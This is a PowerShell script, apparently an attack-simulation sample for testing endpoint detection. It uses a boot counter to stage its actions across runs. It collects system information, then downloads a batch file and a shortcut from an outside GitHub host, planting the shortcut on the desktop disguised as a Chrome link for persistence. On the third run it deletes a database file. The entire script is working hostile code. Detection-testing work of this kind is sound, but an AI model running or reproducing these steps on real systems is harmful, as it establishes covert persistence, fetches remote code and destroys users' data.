
# Temp Folder
$tempfolder = 'C:\temp'


if (!(Get-Item $tempfolder -ea ignore)) { mkdir $tempfolder }


# Static Variables
$countfile = 'C:\temp\bootcount.txt'




#Count
if (Get-Item $countfile -ea ignore) {
    [int]$bootcount = Get-Content $countfile
    if ($bootcount -match "^\d{1,2}$") { ([int]$bootcount) ++ }
    else { $bootcount = 1 }
}
else { $bootcount = 1 }
$bootcount | Out-File $countfile


switch ($bootcount) {
    
    1 {
        # First Run  - get some Infos
        systeminfo >> C:\temp\1.txt
        exit
        
    }
    
    2 {
        # create second persitence mechanism
		$url = "https://raw.githubusercontent.com/fhammers/EDRSample/master/shino.bat"
		$output = "C:\temp\shino.bat"
		Invoke-WebRequest -Uri $url -OutFile $output	
		
		$DesktopPath = [Environment]::GetFolderPath("Desktop")
		$url = "https://github.com/fhammers/EDRSample/raw/master/chrome.lnk"
		$output = "$DesktopPath\Chrome2.lnk"
		Invoke-WebRequest -Uri $url -OutFile $output	
        
        exit
        
    }
    
    3 {
        # Third run
        
        Remove-Item C:\CDB\2020.accdb
        exit
        
    }
    
    default {
        exit
    }
}
